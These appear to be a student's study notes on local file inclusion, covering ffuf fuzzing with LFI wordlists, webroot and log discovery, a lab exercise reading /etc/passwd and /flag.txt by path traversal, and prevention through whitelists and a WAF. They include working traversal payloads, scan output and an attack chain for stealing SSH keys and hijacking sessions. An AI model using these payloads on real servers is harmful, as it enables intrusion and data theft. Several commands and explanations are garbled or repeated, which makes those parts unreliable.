# Autimate scanning:
Its essential to understand how the file inclusion attacks works and how we can manually caft advanced payloads and use custom tech to reach code execution.
This is cause in many case for us to exploit the vulnerability. It may required a custom payload. It may require a custom payload that matches its specific configuratioin.
When dealing with security measures like WAF or firewalls, we have to apply our understading to see how specific paylaod/character is begin to
attempt to craft a custom payload to work around it.
We may not need to manually exploit the LFI vulnerability in many trivial cases, there are many automated methods that can help us quicky to identifying  and exploit the vulnerability.

- Fuzzing Parameters:
The HTML users can use on the web app front-end tend to be properly tested and well secured against different web-app. The page may have other parameters that are not linked to any HTML
form, and hence normal users would never access or unintentuinallity cause harm though. This is why it may be imp to fuzz for parameters, as they tend not be able to be as secure as public ones.

The ataccking Web-app with FUFF module goes into details on how we can fuzz for GET/POST parameters.
Example:
```sh
❯ ffuf -w Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt  -u '' -fs 2287`
```
Once we identifying and exposed parameters that isn't linked to any form we tested, we can perform all of the LFI tests discussed.
This is the not unique to LFI vulnerability the but also applies to most web vulnerabilities discussed.
> [!TIP]
> For more precise scan, can limit our scan to the most popular LFI parameters found [link](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters).

## LFI Wordlist:
So far this module we have been manually crafting our LFI payloads to test for LFI vulnerability. This is cause manaul testing is more reliable and can find LFI vulnerabilities that may not be idendified otherwise, as discussed earlier.
We may want to run a quick test on a parameter too see if it is vulnerable to any common LFI payloads, Which may save us time in web where we need to test for varius vulnerability.

There are a number of [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) we can use for this scan, good wordlist is LFI-jhaddix.txt.
AS it contains varius bypasses and common files, it makes it ez to run several tests at once.
We can use this wordlist to fuzz the [?language] paremeter web have been testing the module:
`ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287`

- Fuzzing Server Files:
In addition to fuzzing LFI payloads there are differents servers files that may be helpful in our LFI explotation so it would be helpful to know where such files exist and whether we can read them.
Such files [Server webroot, server configuratioin files, and server logs].
- Server webroot:
We may need to know the full server webroot path to complete our explotation in some cases, if we wanted to locate a file we uploaded, but we cannot research  its /uploads directory though relative path. We may need to figure out the server webroot path that
we can locate our upload files though absoulute path instead of relative path.
We can fuzz for [index.php] file though common webroot paths, Which we can find in this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) and [Wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)
Example:
`ffuf -w Dictionaries/Dictionaries/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://server:port/index.php?language=/../../FOZZ/index.php' -fs 2287`
As we can see the scan did indeed identify the correct webroot path at [/var/www/html]. We may also use the same LFI-Jhaddix.txt wordlist we used earlier, as it also contains varius payloads.

- Server Logs/Cofiguration:
As we have seen, we need to be able to identify the correct logs dir to be able to perform the logs poisoning attacks we discusses. As we just discussed we may to read the server configuration to able to identify the server webroot path and other imp info.
We may also use the LFI-Jhaddix.txt as it contains many of the server logs and configuration paths we may be interested in.
`ffuf -w LFI-wordlist-Linux:FUZZ -u 'http...FUZZ' -fs 2287`

We can see the scan returned over 60 results, many of Which were not identified with LFI-Jhaddix.txt wordlist, which shows us that a precise scan is imp in certain cases.
[curl http://IP:port/index.php?language../../../ect/apache2/envvarsh]

As we can see the (APACHE_LOG_DIR) variable to /var/log/apache2 and the previus configuration told us that log files are /access.log and /error.log whicj have accessed.

> [!NOTE]
> we can simply use wordlist to find the logs as Wordlist to find the logs, as multiple wordlist we used in this section did shows the log locations, this exercise shows us how we can manually go though identified files, then use the information,
> we find to futher identify more files and imp information. This is quite similar to when we read different files sources in the PMP filters section and such efforts may reveal information about the web app, which can use to futher exploit.

- LFI-Tools:
We can utilize a number of LFI tools to automated much of the process we have been learning, which may save time in some cases, may also miss many vulnerabilities and files we may otherwise identify though manually testing, most common LFI tools are [LFISuites](https://github.com/D35m0nd142/LFISuite), [LFIFreaks](https://github.com/OsandaMalith/LFiFreak) and [Liffy](https://github.com/mzfr/liffy).

- Exercise:
Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt
```sh

ffuf -w Dictionaries/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.48.68:34387/index.php?view=FUZZ' -ic -c -t 200 -fs 1935

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://94.237.48.68:34387/index.php?view=FUZZ
 :: Wordlist         : FUZZ: /home/Anchovy/Dictionaries/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1935
________________________________________________

../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 42ms]
../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 42ms]
../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 42ms]
../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 42ms]
../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 42ms]
../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 44ms]
:: Progress: [922/922] :: Job [1/1] :: 90 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```
[http://94.237.48.68:34387/index.php?view=../../../../../../../../../../../../../../../../../../../../../../flag.txt]

## File inclusion Prevention:
The module has discussed varius ways to detect and exploit file inclusion vulnerabilities, along different ways. Whith that understading of how to identifying file inclusion vulnerabilities
through penetration testing.

- File Inclusion Prevention:
The most effective thing we can do to reduce file inclusion vulnerabilities is to avoid passing any users-controlled inputs any file inclusion funtions or APIs,
the page should be able to dynamicall load assent on the back-end, with no user interaction. In the first section we discussed different funtions that may be utilize to include other files within
a page and the privilege to each funtions.

This may not be feasible as it may require changing the whole arck of an web app, We should utilize a limited whitelist.
This list need to match with the users to file, or even a static json map names and files that can be matched.

- Preventing Directory Traversal:

If attackers can control the dir, they can escape the web app and attacks something they are more familiar with or use a universal attacks chain.

1. Read /etc/passwd and potentially find SSH Keys or know valid user names for pass sprays.
2. Find other services on the box such as Tomcat and read Tomcat-users.xml file.
3. Discover valid PHP Session Cookie and perform session hijacking.
4. Read current web app configuration and source code.


The best way to prevent directory traversal is to use ur programming built-in tool to pull only the filenames, for example go into ur home dir and use the command [cat .?/.*/.?/etc/passwd].
Now type [php -a] to enter the command Line interpreter and run [echo file_get_contents('.?/.*/.?/etc/passwd');], u'll see PHP does not has the same behaviur with the wildcards, if ur replace ? and *
with . the command will work as expected, this is the demostration there is a edge cases with our above funtions, if we have a PHP  execute bash with the system() funtions, the attacker would be catch
edge cases like this and fix it before it gets exploited in our app.
```php
<?php
while(substr_count($input, '../ ', 0)){
    $input = str_replace('../', '', $input);
};
?>
```

- Web App Firwall(WAF):
The universal way to harden app is to utilize a WAF such as [ModSecurity], when dealing the most imp thing to avoid is false positives and blocking non-malicius requests.
ModSecurity minimize false positives by offering a permissive mode, which will only report things it would blocked. This lets defenders tune the rules to make sure no legitimate request is blocked, if the organization, never
wants to turn the WAF to "block mode".
It's v important to remember that the purpose of hardening is to give the application a stronger exterior shell, so when an attack does happen, the defenders have time to defend. According to the FireEye M-Trends Report of 2020, important to remember that the purpose of hardening is to give the application a stronger exterior shell, so when an attack does happen, the defenders have time to defend. According to the FireEye M-Trends Report of 2020, important to remember that the purpose of hardening is to give the application a stronger exterior shell, so when an attack does happen, the defenders have time to defend.
According to the [FireEye M-Trends Report of 2020].

- Exercise:

1. What is the full path to the php.ini file for Apache?
find / -type f -name php.ini 2>/dev/null
/etc/php/7.4/cli/php.ini
/etc/php/7.4/apache2/php.ini

2.  Edit the php.ini file to block system(), then try to execute PHP Code that uses system. Read the /var/log/apache2/error.log file and fill in the blank: system() has been disabled for ________ reasons.
security
